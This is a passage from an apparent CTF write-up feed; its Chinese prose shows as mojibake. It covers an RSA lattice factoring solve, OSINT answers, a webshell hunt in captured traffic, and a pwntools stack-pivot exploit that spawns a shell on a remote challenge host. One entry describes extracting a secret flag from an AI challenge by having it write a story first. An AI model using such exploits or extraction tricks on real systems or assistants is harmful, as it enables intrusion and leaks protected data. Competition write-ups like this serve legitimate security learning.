16518253246325822837502418827700493807621067058438396395472266350036385535241769917459657069911028720968654253735107131282350340465691670072304718987805883113410923109703284511709226857412404454224134480632696, 22032469066601123287586507039704080058983969235246539501189720236880312024198451198788699002335010120658564926677243708367430773661097221076615953342733896063909953602379936312639192315223258556134958059637605, 17474611942177808070315948910226643697957069578572244709354155010512694059987765040746148981545760660371360975936526076852619987733316042847813177383519241505024635332293992920023420060610648140841369822739716, 20097265939024591617239874622716452182434300498447992668997438018575636772416262543204370899462096267444545094719202447520254303983442269757551626971917981420832391886214473318353984504467919530676605744560570, 18170251482705061226968041449812078923477452841162650888922564215790088545936753453513162197661916172215859504545409274440450807677845894292177296835154674774694992388033874349807244020099167681146357128785394, 18084007437523118129421476751918491055914528331902780911288404344016551650138679157754567938593688369062981279371320169939281882307797009116458871503759873023914718337944953764426183937635379280572434676575757, 17001811604221128900675671565539617923973183364469396458234914432162200119518252971721448274846235879320362924206656971472493711107677598961463553324277826426691784458674010708635756004550789902368338633272118, 20217009574515126619724139485885721324936960849401637840860565569588595992087537454744066905387396266844236387315004915383456736142307523960394594650088663019228826091309049211780607761862663242437656610298243, 25534440916970201550118006203706860249111087748000550226680885431006136131742280963090650607632467666558508520152535105122661615376298673454198064361094319699307084117001019115669670029195171047304283891069792, 18871869316294018605789169171879572816494092699556970507058691345095743053290043643010965660058888064972257990750611470141816041727746767146945121588515830427165739580791663951175220638901672353681640741068573, 20173968537913641339915058056878181363456579537994317562789857397928196160113042659777558550242315788417022891612723148843142958668959046890197219991727894451795438138592005695329607326086644956073759609743066, 20601943394990265144021144365970164017319737300436518536503270346147112565303361487668388700369636611354280332841812324530501569200031186584749278453651172121161814207025650519637781007286435981682228528706305, 16397528630087028144645213166977866073543422560337716097539091258081008408890966764995645782823950721804205427713461441138000880478364026137452291234097219085473748076681729365744710225699866258812642458184750, 21373350333568141000876969785296802670776508778278005158047105058430550665787088265486222905402690421155861103648370249249790560185790723042867282734693553039477436055775198037042047438047898227097749354619822, 17767469767416052322357795736899648760868316512079849340028040817353808899589201201338152114229279980849491049574543361275046276135253417685681262008211582060955974064559129311524323185960856955462761555353091, 22148352529815091269441663541923247974004854058764556809596705832663604786920964849725772666340437231503146814919702525852955831173047034475925578238466977606367380212886384487294569287202762127531620290162734, 21663842528026621741414050256553652815372885707031383713657826718944735177083300302064509342116651731671570591336596953911570477161536730982887182434407761036442993588590230296643001682944654490645815177777455, 20219077358929317461660881724990436334639078047412693497584358963241840513748365548465302817975329987854784305275832045889690022909383530837382543579292451297269623663257098458645056099201050578472103957851128, 18255302182526662903763852563401346841065939531070045000414364747445988455597258924280193695407035356029557886165605853810182770534711966292253269625917149411889979307227493949293798772727125069093642134972336, 24926064145128749429079117171467042019887257504329103038171762786986349157515552927216574990423327013202735544601170247730647598931030432792167867343343213411600516855009788294067588153504026267213013591793027, 22369607314724468760253123915374991621544992437057652340350735935680183705467064876346663859696919167243522648029531700630202188671406298533187087292461774927340821192866797400987231509211718089237481902671100, 16994227117141934754898145294760231694287000959561775153135582047697469327393472840046006353260694322888486978811557952926229613247229990658445756595259401269267528233642142950389040647504583683489067768144570, 21758885458682118428357134100118546351270408335845311063139309657532131159530485845186953650675925931634290182806173575543561250369768935902929861898597396621656214490429009706989779345367262758413050071213624, 20156282616031755826700336845313823798147854495428660743884481573484471099887576514309769978525225369254700468742981099548840277532978306665910844928986235042420698332201264764734685502001234369189521332392642, 23291765247744127414491614915358658114280269483384022733002965612273627987872443453777028006606037159079637857473229879140366385523633075816362547967658930666106914269093225208138749470566410361196451552322613, 19807792217079652175713365065361659318870738952921195173619551645956745050506271953949139230097128034416815169649874760890189515620232505703162831090225715453502422905418824316957257395992121750661389503495033, 22074209373194902539215367382758486068533032275912313703269990627206774967653336496619231924013216321042649461711292555464574124714934511202231319963361912937842068483700298097209400217869036338644607607557860, 19678336511265998427322297909733474384702243426420286924671444552444079816707773485084891630780465895504253899943221044355971296122774264925882685351095921532685536165514189427245840338009573352081361238596378, 24746314790210393213546150322117518542380438001687269872679602687597595933350510598742749840102841364627647151669428936678130556027300886850086220074563664367409218038338623691372433831784916816798993162471163, 19346137206512895254202370018555139713690272833895195472766704715282164091959131850520571672509601848193468792313437642997923790118115476212663296111963644011010744006086847599108492279986468255445160241848708, 22739514514055088545643169404630736699361136323546717268615404574809011342622362833245601099992039789664042350284789853188040159950619203242924511038681127008964592137006103547262538912024671048254652547084347, 21491512279698208400974501713300096639215882495977078132548631606796810881149011161903684894826752520167909538856354238104288201344211604223297924253960199754326239113862002469224042442018978623149685130901455, 19381008151938129775129563507607725859173925946797075261437001349051037306091047611533900186593946739906685481456985573476863123716331923469386565432105662324849798182175616351721533048174745501978394238803081, 19965143096260141101824772370858657624912960190922708879345774507598595008331705725441057080530773097285721556537121282837594544143441953208783728710383586054502176671726097169651121269564738513585870857829805]</span><br><span class="line"></span><br><span class="line">k = 2^(512 - 180)</span><br><span class="line"></span><br><span class="line">M = Matrix.column([k * v for v in V]).augment(Matrix.identity(len(V)))</span><br><span class="line">B = [b[1:] for b in M.LLL()]</span><br><span class="line">M = (k * Matrix(B[:len(V)-2])).T.augment(Matrix.identity(len(V)))</span><br><span class="line">B = [b[-len(V):] for b in M.LLL() if set(b[:len(V)-2]) == &#123;0&#125;]</span><br><span class="line"></span><br><span class="line">for s, t in itertools.product(range(100), repeat=2):</span><br><span class="line">    T = s*B[0] + t*B[1]</span><br><span class="line">    a1, a2, a3 = T[0], T[1], T[2]</span><br><span class="line">    kq = gcd(a1 * hints[1] - a2 * hints[0], n)</span><br><span class="line">    if 1 &lt; kq &lt; n:</span><br><span class="line">        print(&#x27;find!&#x27;, kq, s, t)</span><br><span class="line">        break</span><br><span class="line">for i in range(2**16, 1, -1):</span><br><span class="line">    if kq % i == 0:</span><br><span class="line">        kq //= i</span><br><span class="line">q = int(kq)</span><br><span class="line">p = int(n // kq)</span><br><span class="line">print(&#x27;p&#x27;, p)</span><br><span class="line">print(&#x27;q&#x27;,q)</span><br><span class="line">#8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class="line">9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼Œpï¼Œq ç›´æ¥è§£å‡ºç¬¬äºŒéƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from gmpy2 import gmpy2</span><br><span class="line"># kq, s, t = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class="line">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class="line">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class="line">c2 = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(65537, (p-1)*(q-1))</span><br><span class="line">m = pow(c2,d,n)</span><br><span class="line">flag2 = long_to_bytes(m)</span><br><span class="line">print(q*p)</span><br><span class="line">print(flag2)</span><br><span class="line"># b&#x27;s0lve_the_@pb&#x27;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰éƒ¨åˆ†ï¼š</p><p>å‘ç°è¿™é‡Œå¯ä»¥ç›´æ¥ç”¨ç¬¬äºŒéƒ¨åˆ†çš„ pï¼Œ q</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from gmpy2 import gmpy2</span><br><span class="line"># # kq, s, t = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class="line">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class="line">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class="line">c2 = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(65537, (p-1)*(q-1))</span><br><span class="line">m = pow(c2,d,n)</span><br><span class="line">flag2 = long_to_bytes(m)</span><br><span class="line">print(q*p)</span><br><span class="line">print(flag2)</span><br><span class="line"># b&#x27;s0lve_the_@pb&#x27;</span><br><span class="line"></span><br><span class="line">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class="line">c3 = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span><br><span class="line"></span><br><span class="line">n3,e3 = (94789409892878223843496496113047481402435455468813255092840207010463661854593919772268992045955100688692872116996741724352837555794276141314552518390800907711192442516993891316013640874154318671978150702691578926912235318405120588096104222702992868492960182477857526176600665556671704106974346372234964363581, 65537)</span><br><span class="line">c3 = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span><br><span class="line">m3 = pow(c3,d,n)</span><br><span class="line">flag3= long_to_bytes(m3)</span><br><span class="line">print(flag3)</span><br><span class="line"># b&#x27;q_prob1em!!&#125;&#x27;</span><br></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Miscï¼š</h1><h2 id="givemesecret"><a class="markdownIt-Anchor" href="#givemesecret">#</a> givemesecretï¼š</h2><p>â€‹ai é¢˜ï¼Œè™½ç„¶ä¸æ‡‚åŸç†ï¼Œä½†é˜Ÿå‹å‡ºäº†ï¼Œä»–çš„æ–¹æ³•æ˜¯å…ˆè®© ai ç¼–ä¸€ä¸ªæ•…äº‹ï¼Œæ˜¯å¦å’Œ flag æœ‰å…³æˆ‘æ²¡é—®ä»–ï¼Œä¹‹åè®© ai æ˜¾ç¤º flag å³å¯</p><p><img data-src="https://i-blog.csdnimg.cn/direct/2188fc8e167d4abc8b142f462c81ff30.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="master-of-osint"><a class="markdownIt-Anchor" href="#master-of-osint">#</a> Master of OSINTï¼š</h2><p>1. è¿œå¤„æœ‰æµ·ï¼Œæœ‰å±±ï¼Œæœ‰è‰ï¼Œç©ºæ—·ï¼ŒåŒ—æ–¹ï¼Œç¯æµ·æˆ–è€…ç¯æ¹–å…¬è·¯ï¼Œé’æµ·æ¹–ï¼Œæ ¹æ®ä½ç½®å»æ‰¾</p><p>2. ç™¾å®‰å±…å»æ‰¾</p><p>3. å››å·çœæœºåœºé›†å›¢èˆªç©ºåœ°é¢æœåŠ¡æœ‰é™å…¬å¸</p><p>4.IKEA å®œå®¶å®¶å±…é™„è¿‘</p><p>5. é‡åº†</p><p>6.H å½¢å¤§å¦</p><p><img data-src="https://i-blog.csdnimg.cn/direct/a7a84a502b8243e7b5064e67ea497ef4.jpeg#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>7. å·¦ä¾§æ˜¯èˆ¹ï¼Œå³ä¾§è§‰åå¡”ï¼Œæ©˜å­æ´²æ¸¸å®¢ä¸­å¿ƒä½ç½®</p><p>8. ä¸€ä¸ªè·¨æµ·å¤§æ¡¥ï¼Œå³ä¾§è½¦é“ â€œé•¿æ±Ÿâ€</p><p>9. æ­¦æ±‰å¤©å…´æ´²é•¿æ±Ÿå¤§æ¡¥ä¸­é—´</p><p><img data-src="https://i-blog.csdnimg.cn/direct/a7aeeaf030df4557ae759a32c4def541.jpeg#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>10. å®æ³°ç™¾è´§ï¼Œç„¶åæ­å·å’Œæ·±åœ³éƒ½è¯•è¯•ï¼Œç¡®å®šä¸ºæ­å·</p><h2 id="ç­¾åˆ°"><a class="markdownIt-Anchor" href="#ç­¾åˆ°">#</a> ç­¾åˆ°ï¼š</h2><p>â€‹flag å†å†…å®¹é‡Œï¼Œç›´æ¥äº¤ã€‚</p><h2 id="é—®å·è°ƒæŸ¥"><a class="markdownIt-Anchor" href="#é—®å·è°ƒæŸ¥">#</a> é—®å·è°ƒæŸ¥ï¼š</h2><p>â€‹å¡«å†™é—®å·å°±æœ‰ flagã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTFerçš„æ¯”èµ›ä¹‹è·¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯2024é’é¾™ç»„å®˜æ–¹èµ„æ ¼èµ›wp</title>
      <link href="/posts/c2860616.html"/>
      <url>/posts/c2860616.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn02"><a class="markdownIt-Anchor" href="#pwn02">#</a> pwn02:</h1><p>** ç¬¬ä¸€æ­¥ï¼š**checksec å‘ç° 32 ä½æ¶æ„ï¼Œå¼€äº† NX å’Œ ASLRã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/e15f7f729e9047e280f849d9038d0ef1.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>** ç¬¬äºŒæ­¥ï¼š**login å‡½æ•°æœ‰ä¸ªç™»é™†ï¼Œè´¦å·å¯†ç éƒ½åœ¨é‡Œé¢</p><p><img data-src="https://i-blog.csdnimg.cn/direct/aceb7788569e4b7eba0de8d9a96b1d89.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>** ç¬¬ä¸‰æ­¥ï¼š**vuln å‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†æ˜¯åªèƒ½æº¢å‡º 8 ä¸ªå­—èŠ‚ï¼Œç¡®å®šä½æ ˆè¿ç§»ã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/0017c348f35141c0b98d0ca1a3382fce.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>** ç¬¬å››æ­¥ï¼š** ç¼–å†™è„šæœ¬ï¼Œæ”»å‡»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./short&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./short&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;0192d5e6064e782f81f9a9fbc9fc041d.0ke5.dg05.ciihw.cn&quot;</span>,<span class="number">45818</span>)</span><br><span class="line"><span class="comment"># io.recvuntil(b&quot;Enter your username: &quot;)</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"><span class="comment"># io.recvuntil(b&quot;Enter your password: &quot;)</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;admin123&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;You will input this: &quot;</span>)</span><br><span class="line">add = io.recv(<span class="number">10</span>) </span><br><span class="line"><span class="comment"># print(int(add,16))</span></span><br><span class="line">addr = <span class="built_in">int</span>(add,<span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x080483fa</span></span><br><span class="line">system_addr = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = <span class="number">0x804A038</span></span><br><span class="line">vuln_addr = elf.symbols[<span class="string">&quot;vuln&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = p32(ret) + p32(system_addr) + p32(ret) + p32(binsh) + p32(binsh)</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>,<span class="string">b&quot;p&quot;</span>) </span><br><span class="line">payload = payload + p32(addr) + p32(<span class="number">0x08048674</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/81c4aa9d525f4c158218615d13caf5ce.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="misc03"><a class="markdownIt-Anchor" href="#misc03">#</a> misc03ï¼š</h1><p>** ç¬¬ä¸€æ­¥ï¼š** æ‰“å¼€æµé‡åŒ…ï¼Œæ ¹æ®åè®®æ’åºå‘ç°äº†ä¸¤ç§æœ‰ç”¨çš„åè®®ï¼Œä¸€ä¸ª TCPï¼Œä¸€ä¸ª HTTPï¼Œå¯Ÿè§‰å¯èƒ½æ˜¯ä¸ªç½‘ç«™ï¼Œç„¶åè¿‡æ»¤ HTTPï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/935450027d77434ea760ad654e2da17a.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>** ç¬¬äºŒæ­¥ï¼š** è¿‡æ»¤ HTTP åå‘ç°äº†ä¸ªç–‘ä¼¼å±é™© ipï¼š39.144.218.183ï¼Œæœ‰çˆ†ç ´ç›®å½•çš„å¯èƒ½ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/524d347f90dd4aa4a123c2b543563c9c.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>** ç¬¬ä¸‰æ­¥ï¼š** æ ¹æ®å¾ˆå¤šè¯·æ±‚å“åº”å¯¹ï¼Œå‘ç°å¾ˆå¤šéƒ½æ˜¯ 404ï¼Œ404 çš„çŠ¶æ€é•¿åº¦æ¯”è¾ƒçŸ­ï¼Œæ ¹æ® Length æ’åºï¼Œä»æœ€å¤§çš„å’Œæœ€å°çš„å¼€å§‹é€‰ï¼Œæ‰¾å‡ºä¸ä¼—ä¸åŒçš„ä¸€æ‰¹æµé‡ï¼Œå‘ç°äº†æœ¨é©¬å’Œè®¿é—®æœ¨é©¬çš„ ipï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/9ccd78a6d5c34c029ee82a85965bedb1.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>** ç¬¬å››æ­¥ï¼š** è·Ÿè¸ªè¿™ä¸ªæµï¼Œå‘ç°äº†å±é™©çš„ payloadï¼Œç¡®å®šè¿™ä¸ªå°±æ˜¯æ”»å‡»è€…ï¼š<br><img data-src="https://i-blog.csdnimg.cn/direct/6da17fb87b4d4daebf6d6a8a81a7fe50.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wdflag&#123;39.168.5.60&#125;</span><br></pre></td></tr></table></figure><h1 id="crypto01"><a class="markdownIt-Anchor" href="#crypto01">#</a> crypto01ï¼š</h1><p>â€‹åŸé¢˜ï¼Œç›´æ¥ä¸Š https://www.cnblogs.com/mumuhhh/p/17789591.htmlï¼Œæœ‰ä¸ªè„šæœ¬ï¼Œæ”¹ä¸€ä¸‹ï¼Œå…·ä½“å‚æ•°ä¹‹åç›´æ¥ sagemath è·‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span 